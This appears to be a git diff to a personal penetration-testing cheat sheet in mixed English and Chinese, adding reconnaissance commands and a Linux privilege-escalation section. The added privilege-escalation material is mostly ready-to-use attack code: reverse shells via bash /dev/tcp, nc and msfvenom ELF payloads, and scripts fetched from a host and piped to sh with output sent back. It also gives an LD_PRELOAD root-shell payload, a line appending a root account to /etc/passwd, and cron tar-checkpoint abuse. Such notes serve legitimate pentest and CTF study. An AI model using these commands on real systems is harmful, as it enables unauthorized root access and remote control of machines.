@@ -1,4 +1,3 @@
-
 # 1. Recon
 
 ## quick inventory
@@ -27,7 +26,7 @@ nmap -sn $IP/24
 nmap -sT --min-rate 10000 -p- $IP && \
 nmap -sU --min-rate 10000 -p- $IP
 # 使用默认脚本TCP扫描具体端口+版本信息+OS信息
-nmap -sT -sC -O -p $Ports $IP
+nmap -sT -sV -sC -O -p $Ports $IP
 # 使用漏洞脚本扫描固定端口
 nmap --script-vuln -p $Ports $IP
 
@@ -82,6 +81,12 @@ done
 ```bash
 whatweb [opts] <urls>
 ```
+- [nikto](https://github.com/sullo/nikto)
+```bash
+nikto -h <taget.com> -p <port> [-id admin:passwd] [-Plugins +apacheversion] [-ssl] -o <output>
+```
+
+
 
 ## web path
 
@@ -106,6 +111,22 @@ dirsearch -u <target> -e <extensions> [options]
 ```bash
 ffuf -fs 185 -c -w \$(fzf-wordlists) -H 'Host: FUZZ.org' -u "http://$TARGET/"
 ffuf -w /usr/share/dirb/wordlists/common.txt -fc 403,404 -fs 185 -u "http://$TARGET/FUZZ" -p 1
+```
+- [gobuster](https://github.com/OJ/gobuster)
+```bash
+gobuster dir -u <target.com> -w <word> -t 50
+```
+- [feroxbuster](https://github.com/epi052/feroxbuster)
+```bash
+feroxbuster -u <target.com> -x pdf -w <word> -t 50
+```
+- [wfuzz](https://wfuzz.readthedocs.io/en/latest/)
+```bash
+wfuzz -w <word> --hc 404 <target.com>
+```
+- [nikto](https://github.com/sullo/nikto)
+```bash
+nikto -h <target.com> -mutate 1 -mutate-options /path/to/dictionary.txt
 ```
 
 ## ipv6
@@ -184,6 +205,10 @@ theHarvester -d $DOMAIN_NAME -b google
 ```
 - [crt.sh](https://crt.sh)
 
+## domain
+
+- [netcraft: search web by domain](https://searchdns.netcraft.com)
+
 ## subdomain
 
 - [gobuster](https://github.com/OJ/gobuster)
@@ -191,6 +216,7 @@ theHarvester -d $DOMAIN_NAME -b google
 # fzf-wordlists
 /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 # gobuster
+gobuster dns   -u <http://target.com> -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM
 gobuster vhost -u <http://target.com> -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM
 ```
 
@@ -486,7 +512,14 @@ reference:
 
 ## 代码审计
 
-# 3. Privilege Escalation
+# 3. Linux Privilege Escalation
+
+## quick server
+
+```bash
+python -m http.server 80
+php -S 0:80
+```
 
 ## better shell
 
@@ -511,6 +544,10 @@ reference:
 - [online generator](https://www.revshells.com)
 
 cheatsheet:
+- elf file
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Host> LPORT=<p> -f elf -o rshell.elf
+```
 - bash
 ```bash
 bash -i >& /dev/tcp/<host>/4444 0>&1
@@ -536,17 +573,241 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 nc -e /bin/sh <host> 4444
 ```
 
+## 提权原理
+
+- 低权限可以修改可执行文件or脚本，再以高权限身份运行
+- 低权限的运维人员也会记录、使用备份程序，再以高权限完成操作
+- 在权限体系的上层捕捉、拦截、修改凭据信息or权限信息
+
 ## methodology
 
 主流
 
+- [UGO](03.pe/UGO.md)
+- [SUID, SGID](./03.pe/SUID-SGID)
+- Capabilities
+- AppArmor, Selinux
+- ACL
+
 其他
+
+- Grsecurity
+- Pax
+- ExecShield
+- ASLR
+- TOMOYO Linux
+- SMACK
+- Yama
+- CGroups
+- Linux Namespaces
+- StackGuard
+- Proplice
+- seccomp
+- ptrace
+- capsicum
+- Mprotect
+- chroot
+- firejail
 
 在线
 
+- [GTFOBins](https://gtfobins.github.io/)
+
 ## 手工枚举
 
+- 系统枚举
+	- 用户信息
+		- whoami
+		- id \[username\]
+		- who
+		- w
+		- last
+	- uname -a
+	- lsb_release -a
+	- cat /proc/version
+	- cat /etc/issue
+	- hostname, hostnamectl
+	- 网络信息
+		- ip addr (ifconfig)
+		- ip route (route)
+		- ip neigh
+		- arp -a
+		- netstat -a\[t|u\] \[-l\]
+		- netstat -s
+		- netstat -ano
+- sudo -l
+- getcap -r / 2>/dev/null
+- ls -liah
+- history
+- cat /etc/passwd
+- cat /etc/shadow
+- cat /etc/crontab
+- echo $PATH
+- env
+- 进程信息
+	- ps -ef
+	- ps axjf
+	- ps aux
+	- top -n 1
+- find / -perm -u=s -type f 2>/dev/null
+- which pkg 2>/dev/null
+	- awk sed
+	- perl python ruby
+	- gcc g++
+	- vi vim
+	- nmap
+	- find
+	- netcat nc
+	- wget curl tftp ftp
+	- tmux screen
+- 未挂载文件系统
+	- cat /etc/fstab
+
 ## 自动枚举
+
+- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
+- [LinEnum](https://github.com/rebootuser/LinEnum)
+- [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+- [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
+- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) written by py
+- [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
+
+How to use tools
+```bash
+# 1. wget or curl down
+wget <tool.url>
+curl -O <tool.url>
+
+# 2. curl script and execute
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# 3. local network
+##with curl
+sudo python3 -m http.server 80 #Host
+curl <HOST>/linpeas.sh | sh    #Victim
+
+##without curl
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/<HOST>/80 | sh      #Victim
+
+# Excute from memory and send output back to the host
+nc -lvnp 9002 | tee linpeas.out                   #Host
+curl <HOST>:8000/linpeas.sh | sh | nc <HOST> 9002 #Victim
+
+# Read output on host
+less -r linpeas.out
+```
+
+## 密码相关
+
+### 加密算法
+
+常见密文开头和加密方式
+
+- md5: $1
+- bcrypt, blowfish: $2, $2a, $2b, $2y
+- sha-512: $6
+- sha-256: $5
+
+工具识别
+
+- hash-identifier
+
+### 生成密码
+
+- openssl
+```bash
+# generate a user line
+openssl passwd -1 -salt qwe qwe > hash.txt
+# Append this line into passwd file
+echo 'qwe:$1$qwe$D95bkH3CwpH6ffYU7pu0m/:0:0:root:/root:/bin/bash' >> /etc/passwd
+```
+- mkpasswd
+```bash
+mkpasswd -m sha-512 qwe
+```
+
+### 破解密码
+
+- john
+```bash
+john --worldlist=/usr/share/wordlists/rockyou.txt <hash>
+```
+
+## 提权方式
+
+- /etc/shadow 文件
+	- 可读：获得root密文，破解密码
+	- 可写：修改root密文
+- /etc/passwd 文件可写
+	- 新添加一行有root权限的用户
+	- 修改root用户行的 x 为密文
+- sudo 预加载环境变量
+	- sudo -l
+	- env_reset
+	- env_keep+=LD_PRELOAD
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+// filename: shell.c
+// define a shared object
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/bash -p");
+}
+```
+```bash
+vim shell.c
+gcc -fPIC -shared -nostartfiles -o shell.so shell.c
+# 寻找不需要密码就可以以root身份执行的程序
+sudo LD_PRELOAD=/tmp/shell.so find
+```
+- 自动任务文件权限
+	- cat /etc/crontab
+	- 修改有root执行权限的脚本；写入reverse shell
+	- bash -i >& /dev/tcp/\<Host\>/4444 0>&1
+- 自动任务PATH环境变量
+	- 在cron指定的PATH变量中寻找可写地址
+	- 构建有root执行权限的脚本，且路径为相对路径；写入提权脚本
+```bash
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+- 自动任务通配符
+	- 有root权限执行的脚本，固定在某路径tar打包文件
+	- 利用 --checkpoint 和 --checkpoint-action 提权
+```bash
+# on host
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Host> LPORT=4444 -f elf -o rshell.out # and send to target machine
+rlwrap nc -lvnp 4444
+
+# on target
+cd /xxx/yyy
+wget http://<Host>:80/rshell.out
+## `--checkpoint=1` 是 `touch` 命令的一个选项，用于创建一个检查点文件
+## `--checkpoint-action` 选项则用于在每个检查点处执行指定的操作
+touch --checkpoint=1
+touch --checkpoint-action=exec=rshell.out
+```
+- SUID 可执行文件已知利用
+	- find / -perm -u=s -type f 2>/dev/null
+	- searchsploit
+	- [gtfobins](https://gtfobins.github.io/)
+- SUID 共享库注入
+- SUID 环境变量利用
+- SUID-shell 功能利用
+- 密码和密钥历史文件
+- 密码和密钥配置文件查看
+- SSH 密钥敏感信息
+- NFS 提权
+- 内核利用
+- doas less+vi
+- MOTD 机制利用
+- 可预测 PRNG 暴力破解 SSH
 
 # 4. Post Pentest
 
